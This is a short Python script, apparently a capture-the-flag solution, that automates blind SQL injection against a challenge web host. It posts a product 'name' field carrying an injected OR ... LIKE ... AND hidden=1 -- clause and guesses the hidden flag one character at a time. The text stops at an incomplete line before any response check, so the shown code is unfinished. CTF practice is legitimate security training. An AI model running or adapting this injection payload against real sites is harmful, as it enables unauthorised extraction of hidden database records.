import requests
alphabet = "qwertyuiopasdfghjklzxcvbnm0123456789_{}"
flag = ""

while True:
    for i in alphabet:
        req = requests.post("https://inst-l9bxgajrhk.web.vuln.si/products", data={
            "name": f'" OR name LIKE "{flag}{i}%" AND hidden=1 --',
        })
        req 